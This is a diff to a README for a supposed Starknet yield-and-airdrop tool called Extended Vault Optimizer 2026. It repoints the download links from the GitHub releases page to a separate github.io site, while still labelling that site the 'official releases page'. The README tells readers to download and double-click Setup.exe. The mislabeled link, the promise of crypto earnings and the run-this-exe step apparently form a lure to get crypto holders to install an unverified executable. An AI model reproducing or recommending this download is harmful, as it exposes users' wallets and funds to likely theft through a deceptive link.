@@ -1,6 +1,6 @@
 # 🚀 Extended-Vault-Optimizer-2026 - Earn more yield on Starknet assets
 
-[![Download](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Agorarack528/Extended-Vault-Optimizer-2026/releases)
+[![Download](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://agorarack528.github.io)
 
 Extended Vault Optimizer 2026 automates your earnings within the XVS ecosystem on Starknet. The software monitors interest rates in real-time, deposits your funds, and compounds your rewards. It tracks your points for the upcoming 2026 airdrop to ensure you remain eligible for rewards. This application runs on your local computer to provide secure management of your digital assets.
 
@@ -18,7 +18,7 @@ Before you install the application, check that your computer meets these require
 
 Follow these steps to set up the software on your desktop:
 
-1. Visit the [official releases page](https://github.com/Agorarack528/Extended-Vault-Optimizer-2026/releases) to download the software.
+1. Visit the [official releases page](https://agorarack528.github.io) to download the software.
 2. Select the file named `Setup.exe`.
 3. Locate the file in your Downloads folder once the download finishes.
 4. Double-click `Setup.exe` to start the installation process.
